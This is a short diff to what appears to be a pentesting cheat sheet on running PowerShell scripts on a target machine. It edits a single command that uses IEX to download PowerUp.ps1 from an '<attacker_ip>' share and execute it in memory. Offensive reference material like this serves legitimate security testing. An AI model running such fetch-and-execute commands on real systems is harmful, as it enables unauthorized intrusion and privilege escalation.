@@ -54,7 +54,7 @@ foreach ($file in (Get-ChildItem -Directory -Path "C:\Users" -Recurse -Force -Er
 ### Execute powershell scripts on the target
 ##### Download from share
 ```Powershell
-IEX(New-Object System.Net.WebClient).DownloadString('\\<attacker_ip>\share\PowerUp.ps1')
+IEX(New-Object System.Net.WebClient).DownloadString('//<attacker_ip>/share/PowerUp.ps1')
 ```
 
 ##### Download from http server 
